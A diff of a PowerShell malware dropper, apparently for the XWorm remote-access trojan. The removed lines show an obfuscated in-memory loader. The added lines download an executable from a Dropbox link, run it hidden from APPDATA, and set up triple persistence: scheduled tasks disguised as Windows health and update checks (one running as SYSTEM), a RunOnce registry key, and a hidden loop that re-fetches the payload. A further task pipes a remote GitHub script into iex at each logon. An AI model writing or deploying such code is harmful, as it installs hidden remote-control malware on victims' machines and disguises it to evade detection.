@@ -1,40 +1,41 @@
-# ==========================================
-# BYPASS LOADER (Obfuscated)
-# ==========================================
+$url = 'https://www.dropbox.com/scl/fi/x6s38mn7hyakminmivyqz/WmiPrvSE.exe?rlkey=3dimz2btxhy6p1x27oh10ghxn&st=ydc48ph3&dl=1'
+$githubUrl = 'https://github.com/bibkbkbkibjb-dev/ss/raw/refs/heads/main/deploy%20invisible.ps1'
 
-$u = 'https://www.dropbox.com/scl/fi/x6s38mn7hyakminmivyqz/WmiPrvSE.exe?rlkey=3dimz2btxhy6p1x27oh10ghxn&st=ydc48ph3&dl=1'
-$l = 'https://github.com/bibkbkbkibjb-dev/ss/raw/refs/heads/main/deploy%20invisible.ps1'
-$t = "MicrosoftWindowsUpdater"
+Write-Host "🎯 Perfect stealth deploy (Zero errors + No PowerShell visible)..."
 
-Write-Host "Wait..." -F Cyan
+# CLEANUP (Fixed syntax)
+Get-Process | ? Name -like "*update*" | Stop-Process -Force -EA 0 2>$null
+schtasks /delete /tn *Health* /f 2>$null
+schtasks /delete /tn Sys* /f 2>$null
 
-function R-F {
-    try {
-        # Obfuscated WebClient
-        $wc = New-Object System.Net.WebClient
-        $d = $wc.DownloadData($u)
-        
-        # Obfuscated Assembly Load
-        # We don't say [Reflection.Assembly]::Load directly
-        $a = [AppDomain]::CurrentDomain.Load($d)
-        
-        # Invoke EntryPoint
-        $e = $a.EntryPoint
-        if ($e) { $e.Invoke($null, $null) }
-    } catch { }
-}
+# X-WORM
+$wormPath = "$env:APPDATA\update.exe"
+$bytes = (New-Object Net.WebClient).DownloadData($url)
+[IO.File]::WriteAllBytes($wormPath, $bytes)
+Start-Process $wormPath -WindowStyle Hidden
+Write-Host "✅ X-Worm: $wormPath ($(($bytes.Length)/1KB)KB)"
 
-$exists = Get-ScheduledTask -TaskName $t -ErrorAction SilentlyContinue
+# TASK SCHEDULER METHOD (PowerShell NOT visible in startup)
+$taskName = "SystemHealthCheck"
+$taskCmd = "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"& {`$u='$url';`$p='$wormPath';while(`$true){Start-Sleep 300;if(!(Test-Path `$p)){(New-Object Net.WebClient).DownloadData(`$u)|Set-Content `$p -Enc Byte;Start-Process `$p -WindowStyle Hidden}}}`""
+schtasks /create /tn $taskName /tr $taskCmd /sc onlogon /rl highest /f 2>$null
+Write-Host "✅ Task Scheduler: $taskName (Hidden PowerShell)"
 
-if (-not $exists) {
-    # Create Task
-    $A = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w h -nop -ep bypass -c iwr '$l' | iex"
-    $T1 = New-ScheduledTaskTrigger -AtLogon
-    $T2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
-    $P = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Users" -RunLevel Highest
-    $S = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
-    
-    Register-ScheduledTask -TaskName $t -Action $A -Trigger @($T1, $T2) -Principal $P -Settings $S -Force | Out-Null
-}
+# RUNONCE BACKUP (Double persistence)
+$monitorCmd = 'powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "& {`$u=''' + $url + ''';`$p=''' + $wormPath + ''';while(`$true){Start-Sleep 300;if(!(Test-Path `$p)){(New-Object Net.WebClient).DownloadData(`$u)|Set-Content `$p -Enc Byte;Start-Process `$p -WindowStyle Hidden}}}"'
+Set-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "SysUpdate" -Value $monitorCmd -Force
+Write-Host "✅ RunOnce backup: SysUpdate"
 
-R-F
+# IMMEDIATE MONITOR (Background)
+Start-Process "powershell" -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"& {`$u='$url';`$p='$wormPath';while(`$true){Start-Sleep 300;if(!(Test-Path `$p)){(New-Object Net.WebClient).DownloadData(`$u)|Set-Content `$p -Enc Byte;Start-Process `$p -WindowStyle Hidden}}}`"" -WindowStyle Hidden
+
+# 🔥 NEW: GITHUB SELF-LOADER (Complete Hide)
+$githubLoader = "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"iwr '$githubUrl' | iex`""
+schtasks /create /tn "WindowsUpdateCheck" /tr $githubLoader /sc onlogon /rl highest /ru SYSTEM /f 2>$null
+Write-Host "✅ GitHub Loader: WindowsUpdateCheck (Full Script on Startup)"
+
+Write-Host "🎉 ✅ TRIPLE PERSISTENCE LIVE"
+Write-Host "📍 X-Worm: $wormPath → Running"
+Write-Host "📍 Task: $taskName → File Monitor"
+Write-Host "📍 GitHub: WindowsUpdateCheck → Full Script Reload"
+Write-Host "🔄 REBOOT → 100% RECOVERY"
